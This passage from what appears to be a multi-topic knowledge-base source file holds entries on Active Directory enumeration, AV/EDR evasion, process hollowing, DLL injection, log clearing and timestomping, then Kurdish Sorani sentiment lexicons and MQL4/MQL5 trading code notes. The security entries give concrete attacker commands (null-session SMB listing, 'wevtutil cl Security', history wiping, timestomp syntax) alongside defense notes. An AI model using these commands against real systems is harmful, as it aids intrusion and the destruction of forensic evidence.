    'LDAP Enumeration (ldap3) — LDAP (Lightweight Directory Access Protocol) is the primary protocol for querying Active Directory. Attackers enumerate AD objects to map the domain. PYTHON ldap3 LIBRARY: import ldap3; server = ldap3.Server(DC_IP, get_info=ldap3.ALL); conn = ldap3.Connection(server, user="DOMAIN\\\\user", password="pass", auto_bind=True). ENUMERATION TARGETS: 1) USERS — conn.search("DC=domain,DC=com", "(objectClass=user)", attributes=["sAMAccountName","memberOf","description"]). 2) GROUPS — filter: (objectClass=group), find Domain Admins, Enterprise Admins. 3) COMPUTERS — filter: (objectClass=computer), enumerate domain-joined machines. 4) SPNs — filter: (&(objectClass=user)(servicePrincipalName=*)), find kerberoastable accounts. 5) GPOs — filter: (objectClass=groupPolicyContainer). 6) TRUSTS — filter: (objectClass=trustedDomain). 7) PASSWORDS IN DESCRIPTION — search description field for credentials left by admins. ANONYMOUS BIND: some DCs allow unauthenticated LDAP queries. LDAPS: LDAP over SSL (port 636) for encrypted enumeration. TOOLS: ldapsearch (native), ldap3 (Python), windapsearch, ldapdomaindump, SharpLDAP, PowerView (Get-DomainUser, Get-DomainGroup). DEFENSE: disable anonymous LDAP bind, monitor LDAP query volume, restrict LDAP access to authorized systems.', 1.3)

  add('exploit_development', ['bloodhound', 'bloodhound data collection', 'bloodhound.py', 'sharphound', 'active directory graph', 'attack path mapping'],
    'BloodHound Data Collection (BloodHound.py) — BloodHound is a tool that uses graph theory to reveal hidden relationships and attack paths in Active Directory. It identifies the shortest path to Domain Admin. DATA COLLECTION: BloodHound.py (Python ingestor, alternative to SharpHound): bloodhound-python -u user -p password -d domain.com -dc dc01.domain.com -c All. COLLECTION METHODS (-c flag): All, Default, Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, DCOM, PSRemote, ObjectProps, SPNTargets. WHAT IT COLLECTS: 1) GROUP MEMBERSHIPS — who is in Domain Admins, nested group memberships. 2) LOCAL ADMIN RIGHTS — which users have local admin on which computers. 3) ACTIVE SESSIONS — which users are logged into which computers (useful for credential theft). 4) ACL/ACE PERMISSIONS — who can reset passwords, add members, DCSync, WriteDACL, GenericAll, GenericWrite. 5) TRUST RELATIONSHIPS — domain and forest trusts. ANALYSIS: import data into BloodHound GUI (Neo4j backend). Built-in queries: "Find Shortest Path to Domain Admin", "Find Kerberoastable Users", "Find AS-REP Roastable Users". CUSTOM CYPHER QUERIES: write Neo4j Cypher queries for specific attack paths. TOOLS: SharpHound (C# ingestor, run on Windows), BloodHound.py (Python, run remotely), AzureHound (Azure AD), PlumHound (reporting), BloodHound Community Edition. DEFENSE: reduce excessive permissions, monitor for mass LDAP/SMB enumeration, implement tiered admin model.', 1.3)

  add('exploit_development', ['smbmap', 'smb share enumeration', 'smb enumeration', 'smb shares', 'smbclient enumeration', 'network share enumeration'],
    'SMB Share Enumeration (SMBMap) — SMB (Server Message Block) is a network file sharing protocol. Enumerating SMB shares reveals accessible files, credentials, and sensitive data across the network. SMBMAP: smbmap -H TARGET_IP -u user -p password. Features: list shares with permissions (READ, WRITE), recursive directory listing (-R), search for files by pattern (--search-term), download/upload files, command execution on writable shares. ENUMERATION STEPS: 1) DISCOVER SMB HOSTS — nmap -p 445 --open SUBNET. 2) NULL SESSION — smbmap -H TARGET (unauthenticated access). 3) GUEST ACCESS — smbmap -H TARGET -u "" -p "". 4) AUTHENTICATED — smbmap -H TARGET -u user -p pass -d DOMAIN. 5) RECURSIVE LISTING — smbmap -R SHARENAME -H TARGET. INTERESTING FINDINGS: SYSVOL/NETLOGON (GPP passwords, scripts), user home directories, IT admin shares, backup files, database dumps, configuration files with credentials. TOOLS: smbmap, smbclient (smbclient -L //TARGET -U user), CrackMapExec (cme smb TARGET --shares), enum4linux, nmap smb-enum-shares script, Metasploit auxiliary/scanner/smb/smb_enumshares. GPP PASSWORDS: Group Policy Preferences may contain encrypted passwords (cpassword) — decrypt with gpp-decrypt. DEFENSE: disable null sessions, restrict share permissions, audit share access, remove sensitive files from shares.', 1.3)

  // § EVASION & ANTI-FORENSICS — Detection avoidance techniques
  // ═══════════════════════════════════════════════════════════════════════════════

  add('exploit_development', ['payload obfuscation', 'obfuscation technique', 'code obfuscation', 'antivirus evasion', 'av evasion', 'payload encoding', 'edr evasion'],
    'Payload Obfuscation — techniques to modify malicious code so it evades antivirus (AV), EDR, and signature-based detection while maintaining functionality. TECHNIQUES: 1) STRING OBFUSCATION — encrypt/encode strings (base64, XOR, AES) and decrypt at runtime. Replace "cmd.exe" with chr(99)+chr(109)+chr(100)+... 2) CONTROL FLOW OBFUSCATION — insert dead code, opaque predicates, junk loops, reorder functions. 3) VARIABLE RENAMING — use random/meaningless names. 4) PACKING — compress and encrypt the payload, add unpacker stub (UPX, Themida, VMProtect). 5) CODE SIGNING — sign payload with legitimate or stolen code signing certificate. 6) AMSI BYPASS — disable Antimalware Scan Interface in PowerShell before executing payload. 7) SYSCALL EVASION — use direct syscalls (Nt* functions) instead of Win32 API to bypass API hooking by EDR. 8) SLEEP OBFUSCATION — encrypt payload in memory during sleep to evade memory scanning (Ekko, Foliage). 9) CUSTOM LOADERS — write custom shellcode loaders that avoid known patterns. TOOLS: Veil-Evasion, Shellter, msfvenom (encoders: shikata_ga_nai), Donut (shellcode generator), ScareCrow, Nimcrypt2. DEFENSE: behavior-based detection, heuristic analysis, sandboxing, memory scanning, ETW monitoring.', 1.3)

  add('exploit_development', ['process hollowing', 'process hollowing technique', 'process injection hollowing', 'runpe', 'hollow process', 'process replacement'],
    'Process Hollowing — a code injection technique where a legitimate process is created in a suspended state, its memory is unmapped (hollowed out), and replaced with malicious code, then resumed. The malicious code runs under the guise of the legitimate process. STEPS: 1) CREATE SUSPENDED PROCESS — CreateProcessW with CREATE_SUSPENDED flag on a legitimate binary (e.g., svchost.exe, explorer.exe, notepad.exe). 2) UNMAP ORIGINAL CODE — NtUnmapViewOfSection to remove the legitimate executable from memory. 3) ALLOCATE NEW MEMORY — VirtualAllocEx in the hollowed process at the original image base. 4) WRITE MALICIOUS CODE — WriteProcessMemory to inject the payload PE into the allocated memory. 5) FIX ENTRY POINT — GetThreadContext/SetThreadContext to update the thread\'s entry point (EAX/RCX register) to the new PE entry point. 6) RESUME THREAD — ResumeThread to start executing the injected code. ADVANTAGES: the process appears legitimate in Task Manager and process listings, inherits the security context of the hollowed process. DETECTION: compare on-disk image with in-memory image (PE header mismatch), monitor for CREATE_SUSPENDED followed by WriteProcessMemory, ETW tracing, hollows_hunter tool. TOOLS: custom code (C/C++/C#), Metasploit migrate, Cobalt Strike, Process Hacker (detection). WINDOWS API: kernel32.dll (CreateProcess, VirtualAllocEx, WriteProcessMemory, ResumeThread), ntdll.dll (NtUnmapViewOfSection).', 1.3)

  add('exploit_development', ['dll injection', 'dll injection windows', 'dll injection technique', 'loadlibrary injection', 'reflective dll injection', 'dll hijacking injection'],
    'DLL Injection (Windows) — technique to execute arbitrary code within the address space of another running process by forcing it to load a malicious DLL. TECHNIQUES: 1) CREATEREMOTETHREAD + LOADLIBRARY — classic method: OpenProcess → VirtualAllocEx (allocate memory for DLL path string) → WriteProcessMemory (write DLL path) → CreateRemoteThread (call LoadLibraryA with DLL path as argument). The target process loads the DLL and executes DllMain. 2) REFLECTIVE DLL INJECTION — load DLL from memory without touching disk. The DLL contains its own loader that maps itself into memory, resolves imports, and calls DllMain. Avoids filesystem-based detection. 3) APC INJECTION — queue an Asynchronous Procedure Call to a thread: QueueUserAPC(LoadLibraryA, hThread, dllPath). Executes when thread enters alertable wait state. 4) THREAD HIJACKING — suspend target thread, modify its context (EIP/RIP) to point to LoadLibrary, resume. 5) PROCESS DOPPELGANGING — abuse NTFS transactions to load malicious PE. 6) PHANTOM DLL HOLLOWING — combine DLL hollowing with process hollowing. TOOLS: custom injectors (C/C++/Python ctypes), Metasploit (post/windows/manage/dll_inject), Cobalt Strike, sRDI (Shellcode Reflective DLL Injection). DETECTION: monitor for VirtualAllocEx + WriteProcessMemory + CreateRemoteThread sequence, check loaded DLLs against known-good list, use ETW for DLL load events.', 1.3)

  add('exploit_development', ['log clearing', 'log tampering', 'anti forensics logs', 'event log clearing', 'clear tracks', 'cover tracks'],
    'Log Clearing / Tampering — anti-forensic techniques to remove or modify evidence of attacker activity from system logs. WINDOWS: 1) EVENT LOG CLEARING — wevtutil cl Security, wevtutil cl System, wevtutil cl Application (clears entire log). PowerShell: Clear-EventLog -LogName Security. 2) SELECTIVE DELETION — use tools to remove specific events without clearing entire log (more stealthy): Invoke-Phant0m (kills Event Log threads), EventCleaner (remove individual records). 3) DISABLE LOGGING — stop Windows Event Log service: net stop eventlog, or disable audit policies. 4) SYSMON EVASION — unload Sysmon driver, patch Sysmon in memory. LINUX: 1) LOG FILES — truncate or edit /var/log/auth.log, /var/log/syslog, /var/log/wtmp, /var/log/btmp, /var/log/lastlog. 2) BASH HISTORY — unset HISTFILE, export HISTSIZE=0, history -c, rm ~/.bash_history, or use " " prefix (HISTCONTROL=ignorespace). 3) UTMP/WTMP — edit binary login records to remove login traces. 4) JOURNAL — journalctl --rotate --vacuum-time=1s (clear systemd journal). TIMESTOMPING: modify file timestamps to blend in (touch -t YYYYMMDDHHMM file). TOOLS: Meterpreter (clearev), Cobalt Strike (timestomp), timestomp.exe, Metasploit post modules. DEFENSE: centralized logging (SIEM), log forwarding to immutable storage, file integrity monitoring, enable audit policies for log clearing (Event ID 1102).', 1.3)

  add('exploit_development', ['file timestomping', 'timestomping technique', 'timestamp manipulation', 'modify file timestamp', 'mace values', 'file time forgery'],
    'File Timestomping — anti-forensic technique of modifying file timestamps (MACE values: Modified, Accessed, Created, Entry Modified) to make malicious files appear as if they were created long ago, blending in with legitimate system files. WINDOWS TIMESTAMPS: $STANDARD_INFORMATION (shown in Explorer, easily modified) and $FILE_NAME (in MFT, harder to modify). TECHNIQUES: 1) POWERSHELL — (Get-Item file.exe).CreationTime = "01/01/2020 12:00:00"; (Get-Item file.exe).LastWriteTime = "01/01/2020 12:00:00"; (Get-Item file.exe).LastAccessTime = "01/01/2020 12:00:00". 2) TIMESTOMP (Metasploit) — timestomp.exe file.exe -m "01/01/2020 12:00:00" -a "01/01/2020 12:00:00" -c "01/01/2020 12:00:00" -e "01/01/2020 12:00:00". 3) COBALT STRIKE — timestomp command. 4) WINDOWS API — SetFileTime() from kernel32.dll. LINUX: touch -t YYYYMMDDHHMM.SS file, touch -r reference_file target_file (copy timestamps from another file). DETECTION: compare $STANDARD_INFORMATION vs $FILE_NAME timestamps in MFT (mismatch indicates timestomping), use forensic tools: MFTECmd, Autopsy, Sleuth Kit (istat), NTFS Log analysis ($UsnJrnl, $LogFile). DEFENSE: enable audit logging for file changes, use immutable file systems where possible, correlate timestamps across multiple artifacts.', 1.2)

  add('exploit_development', ['polymorphic shellcode generation', 'polymorphic payload', 'metamorphic code', 'self-modifying shellcode', 'polymorphic engine', 'shellcode mutation'],
    'Polymorphic Shellcode — shellcode that mutates its appearance each time it is generated or executed while maintaining the same functionality. Designed to evade signature-based detection. HOW IT WORKS: 1) ENCODER — takes original shellcode and encrypts/encodes it with a random key. 2) DECODER STUB — small assembly routine prepended to encoded shellcode that decrypts it at runtime. 3) MUTATION — each generation uses different keys, different decoder stub variations, different NOP-equivalent instructions, and different register usage. COMPONENTS: polymorphic engine (generates unique encoded output each time), decoder stub generator (creates varied but functionally equivalent stubs), garbage/dead code inserter (adds junk instructions that do nothing). TECHNIQUES: XOR with random key (simplest), multi-byte XOR, rolling XOR, ADD/SUB encoding, register reassignment, instruction substitution (mov eax,0 ↔ xor eax,eax), NOP sled variation (use NOP-equivalents: xchg eax,eax; lea esi,[esi]; inc ecx; dec ecx). METAMORPHIC CODE: goes beyond polymorphic — completely rewrites itself using semantic-preserving transformations (instruction reordering, register reassignment, equivalent instruction substitution). TOOLS: msfvenom shikata_ga_nai encoder, custom polymorphic engines, Veil-Evasion, Hyperion (PE crypter). DEFENSE: heuristic analysis, emulation-based detection, sandbox execution, behavior monitoring.', 1.3)

  add('exploit_development', ['base64 payload encoding', 'xor payload encoding', 'payload encoding technique', 'shellcode base64', 'encoded payload delivery', 'payload encoding scheme'],
    'Base64 / XOR Payload Encoding — common techniques for encoding payloads to bypass basic security filters, WAFs, and network inspection. BASE64 ENCODING: convert binary payload to printable ASCII (A-Z, a-z, 0-9, +, /). Usage: PowerShell: powershell -enc [base64_encoded_command]. Python: import base64; encoded = base64.b64encode(shellcode). Bash: echo shellcode | base64. Decoder: base64.b64decode(encoded). LIMITATIONS: base64 is easily recognized and decoded by security tools — use as transport encoding, not evasion. XOR ENCODING: XOR each byte of the payload with a key. Single-byte XOR: for byte in shellcode: encoded.append(byte ^ key). Multi-byte XOR: cycle through key bytes. Rolling XOR: each byte XORed with previous ciphertext byte. ADVANTAGES: simple, fast, no size increase (unlike base64), key can be derived at runtime. COMBINED ENCODING: XOR first then base64 for layered encoding. CUSTOM ENCODING: 1) Caesar cipher on bytes, 2) byte rotation, 3) AES encryption with key derived from environment (anti-sandbox), 4) RC4 stream cipher. STAGED DELIVERY: stage 1 is a small decoder that downloads and decodes stage 2 from C2. DETECTION: entropy analysis (encoded data has high entropy), pattern matching for common encoding artifacts, sandbox detonation. TOOLS: msfvenom encoders, custom Python scripts, CyberChef (encoding/decoding Swiss army knife).', 1.3)

  // ── Kurdish Sorani — Sentiment Analysis ───────────────────────────────────
  // Based on data from Hrazhan/sentiment (Hameed, Ahmadi & Daneshfar, 2023)
  // "Transfer Learning for Low-Resource Sentiment Analysis"
  // https://github.com/Hrazhan/sentiment

  add('language', ['sorani sentiment', 'kurdish sentiment', 'kurdish sentiment analysis', 'sorani emotion analysis', 'هەستی کوردی'],
    'Kurdish Sorani sentiment analysis is based on the gold-standard benchmark dataset (1,189 tweets) and silver-standard dataset (1,500 tweets) from Hameed, Ahmadi & Daneshfar (2023). Classes: positive (خۆشحاڵ), negative (خەمبار), neutral (بێلایەن), mixed (تێکەڵ). The gold standard uses 5 classes (positive, negative, neutral, mixed, none) with human annotation. The silver standard is auto-annotated with 3 classes. Source: https://github.com/Hrazhan/sentiment — "Transfer Learning for Low-Resource Sentiment Analysis" (ACM Trans. Asian Low-Resour. Lang. Inf. Process.). The dataset contains Central Kurdish tweets annotated for sentiment, subjectivity, offensiveness, and targeting.', 1.4)

  add('language', ['sorani positive words', 'kurdish positive sentiment', 'kurdish happy words', 'وشەی خۆش'],
    'Kurdish Sorani positive sentiment words (from Hrazhan/sentiment corpus analysis): خۆشحاڵ (xoshḥal — happy), جوان (cwan — beautiful), باش (bash — good), خۆش (xosh — pleasant), سوپاس (supas — thanks), سپاس (spas — gratitude), بەختەوەر (baxtawar — fortunate), ئازاد (azad — free), سەرکەوتن (sarkawtin — success), هیوا (hîwa — hope), خۆشەویستی (xoshawîstî — love), ئارام (aram — calm), دڵخۆش (diłxosh — glad), پیرۆز (pîroz — congratulations), گەشبین (gashbîn — optimistic), توانا (twana — capable), ئاسوودە (asûda — peaceful), دڵسۆز (diłsoz — loyal), شانازی (shanazî — pride), پاک (pak — pure), ڕاست (rast — honest), شیرین (shirîn — sweet). Example: "زۆر خۆشحاڵ ئەبین" (I am very happy).', 1.3)

  add('language', ['sorani negative words', 'kurdish negative sentiment', 'kurdish sad words', 'وشەی خەمبار'],
    'Kurdish Sorani negative sentiment words (from Hrazhan/sentiment corpus analysis): خەم (xam — sadness), ئازار (azar — pain), ترس (tirs — fear), بێزار (bêzar — fed up), ناشرین (nashrîn — ugly), خراپ (xirap — bad), قەلەق (qalaq — anxious), نەخۆش (naxosh — sick), هەڵە (hała — wrong), تووڕە (tûra — angry), شەڕ (sharr — conflict), کێشە (kêsha — problem), ئەندوو (andû — sorrow), نارەزایی (narazayî — disapproval), زیان (ziyan — damage), دڵتەنگ (diltang — sad/homesick), ڕق (riq — hatred), نەفرەت (nafrat — hate), درۆ (dirrô — lie), داخ (dax — regret), مردن (mirdin — death), گەندەڵ (gandał — corrupt), شکست (shikast — defeat), زوڵم (zulm — oppression), تەنیا (tanya — lonely), گریان (giryan — crying). Example: "زۆر دڵتەنگم" (I am very sad/homesick).', 1.3)

  add('language', ['sorani sentiment examples', 'kurdish tweet sentiment', 'kurdish sentiment samples', 'نموونەی هەست'],
    'Kurdish Sorani sentiment examples from Hrazhan/sentiment gold-standard corpus (real tweets): POSITIVE: "بەختەوەرترینی ئەو مرۆڤانە ئەوەن کە بە هەموو بەشێکی خودا ڕازین" (Blessed are those content with God\'s gifts) | "جوانی ئەوەیە بە ناو خەڵک‌دا بڕۆی بۆنی ئەخلاقت لێ‌ بێت" (Beauty is when your manners precede you). NEGATIVE: "ناشرینترین کەس ئەو کەسەیە کە هەڵەکانت تۆمار دەکات" (Ugliest person records your mistakes) | "لە ماڵەوە بێزارن و کە دەچیتە دەرەوە هەست بە ترس و قەلەقی دەکەی" (Fed up at home, scared outside). MIXED: "ئەوەی زۆر پێدەکەنێ کێشەی زۆرە ئەوەی زۆر دەگرێ کەسایەتی پاک" (Who laughs most has many problems, who cries most has a pure personality).', 1.3)

  add('language', ['sorani morphology analysis', 'kurdish morphological analysis', 'kurdish word structure', 'شیکاری وشە'],
    'Kurdish Sorani morphological analysis enables decomposition of words into morphemes. Prefixes: دە- (da — present tense), نا- (na — negation), بـ (bi — subjunctive), هەڵ- (hał — up/rising), دا- (da — down), ڕا- (ra — away/direct), وەر- (war — receive). Suffixes: -ان (an — plural), -ەکان (akan — definite plural), -ەکە (aka — definite singular), -ێک (êk — indefinite), -ی (î — ezafe/possessive), -ن (n — verb plural), -م (m — 1st person), -ت (t — 2nd person), -ین (în — 1st plural), -انە (ana — abstract noun), -کار (kar — doer), -گەر (gar — doer). Examples: خوێندکار → خوێند+کار (student = study+doer), دادپەروەر → داد+پەروەر (judge = justice+keeper), سەرکەوتوو → سەر+کەوت+وو (successful = head+fell+past participle).', 1.4)

  add('language', ['sorani transliteration', 'kurdish script conversion', 'kurdish latin arabic script', 'ڕێنووسی لاتین'],
    'Kurdish Sorani transliteration converts between Arabic-based Kurdish script and Latin script. Key mappings: ئ↔\' (hamza), ا↔a, ب↔b, پ↔p, ت↔t, ج↔c, چ↔ç, ح↔ḥ, خ↔x, د↔d, ر↔r, ڕ↔ř (trilled r — unique to Kurdish), ز↔z, ژ↔j (zh sound), س↔s, ش↔ş, ع↔\', غ↔ẍ, ف↔f, ڤ↔v (unique to Kurdish), ق↔q, ک↔k, گ↔g, ل↔l, ڵ↔ł (velarized l — unique to Kurdish), م↔m, ن↔n, و↔w/û, ۆ↔o, ه↔h, ە↔e, ی↔y/î, ێ↔ê. Unique Kurdish letters not in Arabic: ڕ (ř), ڵ (ł), ڤ (v), ێ (ê), ۆ (o), پ (p), چ (ç), گ (g), ژ (j). Examples: "کوردستان" → "Kurdistan", "سڵاو" → "sław", "خوێندکار" → "xwêndkar".', 1.3)

  add('language', ['sorani stemming', 'kurdish suffix stripping', 'sorani word stemmer', 'کردارەکانی ڕەگ'],
    'Kurdish Sorani stemming strips inflectional suffixes to find root forms. Agglutinative morphology means multiple suffixes can stack: بەختەوەرترینی = بەختەوەر (root: fortunate) + ترین (superlative) + ی (ezafe). Common suffixes (longest-first stripping): -ترینی (superlative+ezafe), -ترین (superlative: most/-est), -ەکان (definite plural), -ەکە (definite singular), -مان (1st person plural), -تان (2nd person plural), -یان (3rd person plural), -بێت (subjunctive be), -تر (comparative: more/-er), -ان (plural), -یی (abstract noun), -ێت (3rd person present), -م (1st person), -ت (2nd person), -ی (ezafe/possessive), -ن (plural/verb). Examples: خۆشحاڵم → خۆشحاڵ (happy), دڵتەنگم → دڵتەنگ (homesick), ناشرینترین → ناشرین (ugly), جوانی → جوان (beautiful), سەرکەوتووت → سەرکەوتوو (successful).', 1.4)

  add('language', ['sorani negation', 'kurdish negation patterns', 'sorani negation particles', 'نەکردن'],
    'Kurdish Sorani negation uses particles and prefixes: نا (na — general negation, "not"), نە (na — verb negation prefix), هیچ (hîch — "nothing/none", intensifies negation), بێ (bê — "without", privative prefix), نەک (nak — "lest/not that"). Negation flips sentiment polarity in NLP: "نا خۆشحاڵ" (not happy) = negative. Verb negation: present "نا+دە+verb" → "ناکات" (doesn\'t do); past "نە+verb" → "نەکرد" (didn\'t do). Double negation is emphatic, not canceling: "هیچ نازانم" (I don\'t know at all). Privative prefix بێ creates adjectives: بێ+سوود = بێسوود (useless), بێ+ڕەحم = بێڕەحم (merciless).', 1.3)

  add('language', ['sorani intensifiers', 'kurdish emphasis words', 'sorani degree adverbs', 'زۆر'],
    'Kurdish Sorani intensifiers modify sentiment strength: زۆر (zor — very, 1.5x multiplier), تەواو (tawaw — completely, 1.6x), گەلەک (galak — very much, 1.4x), هیچ (hîch — at all, 1.3x, with negation), بەتایبەت (bataybat — especially, 1.3x), بەشێوەیەکی (bashêwayakî — in a way, 1.2x), ئەوەندە (awanda — so much, 1.4x), هێندە (hênda — this much, 1.3x). Usage: "زۆر خۆشحاڵم" (I am VERY happy), "تەواو هەڵە بوو" (was COMPLETELY wrong), "گەلەک سوپاس" (MANY thanks). Intensifiers amplify both positive and negative sentiment signals in text analysis.', 1.3)

  add('language', ['sorani idioms', 'kurdish expressions', 'sorani proverbs meaning', 'پەند'],
    'Kurdish Sorani idiomatic expressions carry sentiment beyond literal meaning: "دڵی ئاو بوو" (heart melted — overwhelming emotion, positive), "سەری گەرم بوو" (head got hot — became angry, negative), "چاوی لێ ڕۆشن بوو" (eyes brightened — became happy, positive), "دەست لە سەری گرت" (held the head — worried/troubled, negative), "دڵی شکا" (heart broke — deeply saddened, negative), "سەری بەرز بوو" (head raised — proud, positive), "دەستی خۆش بوو" (hand was pleasant — appreciated, positive), "پشتی تێ شکا" (back broke behind — lost support, negative). Understanding idioms is essential for accurate Kurdish sentiment analysis beyond single-word lexicon matching.', 1.3)

  // ── Trading Programming: MT4/MQL4 ────────────────────────────────────────────

  add('trading_programming', ['mt4 programming', 'mql4 language', 'metatrader 4 coding', 'mt4 expert advisor'],
    'MetaTrader 4 (MT4) uses MQL4 (MetaQuotes Language 4), a C-like language for algorithmic trading. Key concepts: Expert Advisors (EAs) — automated trading programs; Custom Indicators — technical analysis tools; Scripts — one-time execution programs. Core functions: init()/OnInit(), deinit()/OnDeinit(), start()/OnTick(). Order functions: OrderSend(), OrderModify(), OrderClose(), OrderDelete(). Market data: Bid, Ask, Close[], Open[], High[], Low[], Volume[]. Built-in indicators: iMA(), iRSI(), iMACD(), iBollinger(), iStochastic(). File structure: .mq4 (source), .ex4 (compiled). MQL4 supports OOP since build 600+.', 1.5)

  add('trading_programming', ['mql4 order management', 'mt4 order send', 'mt4 trade execution', 'mql4 trading functions'],
    'MQL4 order management: OrderSend(symbol, cmd, volume, price, slippage, stoploss, takeprofit, comment, magic, expiration, color) returns ticket number or -1 on failure. Order types: OP_BUY (0), OP_SELL (1), OP_BUYLIMIT (2), OP_SELLLIMIT (3), OP_BUYSTOP (4), OP_SELLSTOP (5). Order selection: OrderSelect(ticket, SELECT_BY_POS/SELECT_BY_TICKET). Order info: OrderTicket(), OrderType(), OrderLots(), OrderOpenPrice(), OrderStopLoss(), OrderTakeProfit(), OrderProfit(), OrderMagicNumber(). Pool iteration: for(int i=OrdersTotal()-1; i>=0; i--) { OrderSelect(i, SELECT_BY_POS); }. Always check return values and use GetLastError() for error handling.', 1.4)

  add('trading_programming', ['mql4 indicator', 'mt4 custom indicator', 'mt4 indicator buffer', 'mql4 technical analysis'],
    'MQL4 custom indicator development: Use #property indicator_chart_window or indicator_separate_window. Indicator buffers: SetIndexBuffer(), SetIndexStyle(), IndicatorBuffered(). Drawing styles: DRAW_LINE, DRAW_HISTOGRAM, DRAW_ARROW, DRAW_NONE. Built-in indicator functions: iMA() (Moving Average), iRSI() (Relative Strength Index), iMACD(), iBands() (Bollinger Bands), iStochastic(), iATR(), iCCI(), iADX(), iCustom() (call custom indicators). Timeframes: PERIOD_M1, PERIOD_M5, PERIOD_M15, PERIOD_M30, PERIOD_H1, PERIOD_H4, PERIOD_D1, PERIOD_W1, PERIOD_MN1. Use IndicatorCounted() for optimization.', 1.4)

  add('trading_programming', ['mql4 risk management', 'mt4 lot size calculation', 'mt4 money management', 'mql4 position sizing'],
    'MQL4 risk management implementation: Lot size calculation: double lots = (AccountBalance() * riskPercent / 100) / (stopLossPips * MarketInfo(Symbol(), MODE_TICKVALUE)). Key functions: AccountBalance(), AccountEquity(), AccountFreeMargin(), AccountMargin(). MarketInfo() modes: MODE_SPREAD, MODE_POINT, MODE_TICKSIZE, MODE_TICKVALUE, MODE_LOTSIZE, MODE_MINLOT, MODE_MAXLOT, MODE_LOTSTEP. Drawdown tracking: maxDrawdown = MathMax(maxDrawdown, (peakEquity - AccountEquity()) / peakEquity * 100). Use NormalizeDouble(lots, 2) for lot normalization. Always validate: lots >= MarketInfo(Symbol(), MODE_MINLOT).', 1.4)

  add('trading_programming', ['mql4 backtesting', 'mt4 strategy tester', 'mt4 optimization', 'mql4 backtest'],
    'MT4 Strategy Tester for backtesting EAs: Access via View → Strategy Tester (Ctrl+R). Models: Every Tick (most accurate), Control Points, Open Prices Only. Key settings: Symbol, Period, Spread, Date range. Optimization: uses genetic algorithm or complete search over input parameters. Results: Profit Factor, Expected Payoff, Maximal Drawdown, Total Trades, Sharpe Ratio. Code considerations: avoid future reference (look-ahead bias), use proper bar indexing (0 = current, 1 = previous), handle weekends/gaps. Visual mode for debugging. Export reports as HTML. Custom optimization criterion via OnTester() return value.', 1.3)

  // ── Trading Programming: MT5/MQL5 ────────────────────────────────────────────

  add('trading_programming', ['mt5 programming', 'mql5 language', 'metatrader 5 coding', 'mt5 expert advisor'],
    'MetaTrader 5 (MT5) uses MQL5, a fully object-oriented language (classes, inheritance, interfaces, templates, generics). Architecture: event-driven with handlers OnInit(), OnDeinit(), OnTick(), OnTimer(), OnChartEvent(), OnTrade(), OnTradeTransaction(), OnTester(), OnCalculate(). Key differences from MQL4: position-based accounting (netting/hedging), CTrade class for orders, CSymbolInfo/CPositionInfo/COrderInfo wrapper classes. Supports multi-currency/multi-timeframe testing, MQL5 Cloud Network for distributed optimization, built-in debugger and profiler, native OpenCL support for GPU computing.', 1.5)

  add('trading_programming', ['mql5 trade class', 'mql5 ctrade', 'mt5 order execution', 'mql5 trading functions'],
    'MQL5 trading uses the CTrade class from <Trade/Trade.mqh>: CTrade trade; trade.SetExpertMagicNumber(magicNumber); trade.Buy(volume, symbol, price, sl, tp, comment); trade.Sell(volume, symbol, price, sl, tp, comment); trade.BuyLimit/SellLimit/BuyStop/SellStop for pending orders. Position management: CPositionInfo pos; pos.Select(symbol); pos.Volume(); pos.Profit(); pos.StopLoss(); pos.TakeProfit(). Order types: ORDER_TYPE_BUY, ORDER_TYPE_SELL, ORDER_TYPE_BUY_LIMIT, ORDER_TYPE_SELL_LIMIT, ORDER_TYPE_BUY_STOP, ORDER_TYPE_SELL_STOP, ORDER_TYPE_BUY_STOP_LIMIT, ORDER_TYPE_SELL_STOP_LIMIT. Account modes: ACCOUNT_MARGIN_MODE_RETAIL_NETTING, ACCOUNT_MARGIN_MODE_RETAIL_HEDGING.', 1.4)

  add('trading_programming', ['mql5 indicator handle', 'mt5 custom indicator', 'mql5 indicator buffer', 'mql5 technical indicator'],
    'MQL5 indicators use handle-based architecture: int handle = iMA(symbol, period, maPeriod, shift, method, appliedPrice). Copy data: CopyBuffer(handle, bufferIndex, startPos, count, buffer[]). Built-in indicators: iMA, iRSI, iMACD, iBands, iStochastic, iATR, iCCI, iADX, iIchimoku, iAlligator, iCustom. Custom indicators: OnCalculate(rates_total, prev_calculated, time[], open[], high[], low[], close[], tick_volume[], volume[], spread[]). Plotting: #property indicator_plots, PlotIndexSetInteger(), PlotIndexSetDouble(), PlotIndexSetString(). DRAW_LINE, DRAW_SECTION, DRAW_HISTOGRAM, DRAW_ARROW, DRAW_CANDLES, DRAW_FILLING, DRAW_COLOR_LINE.', 1.4)

  add('trading_programming', ['mql5 oop', 'mql5 classes', 'mql5 object oriented', 'mql5 inheritance'],
    'MQL5 OOP features: Classes with constructors/destructors, public/private/protected access, inheritance (single), virtual functions, abstract classes (pure virtual), interfaces, templates, function overloading, operator overloading. Standard Library: CObject (base), CArrayObj, CList, CDictionary, CExpert (trading framework), CExpertSignal, CExpertTrailing, CExpertMoney. Design patterns: Strategy pattern for signal modules, Observer for event handling. Example: class CMyExpert : public CExpert { virtual bool InitSignal(); virtual bool InitTrailing(); virtual bool InitMoneyManagement(); }. Use #include <Expert/Expert.mqh> for the MQL5 Expert framework.', 1.4)

  add('trading_programming', ['mql5 strategy tester', 'mt5 backtesting', 'mt5 optimization', 'mql5 backtest multi currency'],
    'MT5 Strategy Tester advantages over MT4: Real tick data from broker, multi-currency/multi-timeframe testing, forward testing (walk-forward), MQL5 Cloud Network (thousands of agents for optimization). Testing modes: Every Tick, Every Tick Based on Real Ticks, 1 Minute OHLC, Open Price Only, Math Calculations. Optimization: Genetic Algorithm, Complete Search. Criteria: Balance, Balance+Max Sharpe, Balance+Max Profit Factor, Balance+Max Expected Payoff, Custom (OnTester()). OnTesterInit()/OnTesterDeinit()/OnTesterPass() for frame-based analysis. Visual testing with chart replay. Agent-based parallel processing.', 1.3)

  add('trading_programming', ['mql5 database', 'mql5 sqlite', 'mql5 file operations', 'mql5 data storage'],
